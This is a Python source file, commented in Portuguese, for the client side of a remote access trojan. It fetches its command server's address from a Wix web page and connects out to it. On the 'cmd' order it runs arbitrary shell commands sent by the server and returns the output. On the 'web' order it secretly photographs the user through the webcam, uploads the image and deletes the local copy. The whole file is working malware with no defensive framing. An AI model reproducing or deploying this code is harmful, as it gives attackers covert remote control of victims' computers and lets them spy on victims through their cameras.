import socket
import requests
from bs4 import BeautifulSoup
import os
import subprocess
import cv2



class main():
    def __init__(self):



        self.hostname = socket.gethostname()
        self.achou_web = 0


    def webscrap_ip(self):
        self.header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36'}
        self.pagina = requests.get('https://pythomprogrammingg.wixsite.com/request/requestip', headers=self.header)
        self.soup = BeautifulSoup(self.pagina.content, 'html.parser')

        self.ip = str(self.soup.find_all("h3", style="font-size:26px;")[0])

        self.find = self.ip.find('>')

        self.ip = self.ip[(self.find + 1):]
        self.find = self.ip.find('<')
        self.ip = self.ip[:self.find]

        self.content = self.ip.split()

        self.ip = (self.content[0], int(self.content[1]))
        print('IP SCRAPPADO:\n',self.ip)

    def connecting(self):
        while True:
            while True:

                try:
                    self.cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    class_.webscrap_ip()

                    self.cliente.connect((self.ip))

                    self.msg = self.cliente.recv(1024).decode()
                    if self.msg == '':
                        pass
                    else:
                        print('recebendo mensagem do servidor> {}'.format(self.msg))
                        break
                except:
                    print('falhou, tentando novamente')
                    self.cliente.close()


            self.cliente.send(str.encode(self.hostname))
            print('enviei meu nome para o servidor!')
            while True:

                try:

                    self.command = self.cliente.recv(1024).decode()


                    print(self.command)
                except:

                    break
                if self.command == '':
                    break
                print(self.command)


                if self.command == 'check':
                    self.cliente.send(str.encode('{} here'.format(self.hostname)))




                elif self.command == 'cmd':
                    self.cliente.send(str.encode('conectado ao cmd!'))
                    self.command = self.cliente.recv(1024).decode()
                    print(self.command)
                    while True:
                        if self.command == 'back':
                            break
                        self.cmd = subprocess.Popen(args=self.command, shell=True, stdout=subprocess.PIPE,
                                                    stderr=subprocess.PIPE,
                                                    stdin=subprocess.PIPE)
                        self.output = (self.cmd.stdout.read() + self.cmd.stderr.read()).decode('Utf-8',
                                                                                               errors='ignore')
                        print(self.output)
                        self.cliente.send(str.encode((self.output) + (os.getcwd()) + '$'))
                        try:
                            self.command = self.cliente.recv(1024).decode()
                        except:
                            pass

                elif self.command =='web':
                    self.achou_web = 0
                    try:

                        self.webcam = cv2.VideoCapture(0)

                        if self.webcam.isOpened():
                            self.validacao, self.frame = self.webcam.read()
                            cv2.imwrite('img.png', self.frame)
                            self.achou_web = 1

                    except:
                        self.cliente.send(str.encode('nao tem web'))
#-----------------------------------------------------------------------------------------------------
                    if self.achou_web ==1:
                        self.arquivo = open('img.png', 'rb')
                        print(type(self.arquivo))
                        self.ler_arquivo = self.arquivo.read()
                        print(self.ler_arquivo)

                        while self.ler_arquivo:
                            self.cliente.send(self.ler_arquivo)
                            self.ler_arquivo = self.arquivo.read()
                        self.cliente.send(str.encode('arquivo enviado'))
    #---------------------------------------------------------------------------------------------------
                        self.webcam.release()
                        cv2.destroyAllWindows()
                        self.arquivo.close()
                        subprocess.Popen(args='DEL /F /A img.png', shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)











                else:
                    print('server desconectou')
                    break




class_ = main()
class_.connecting()

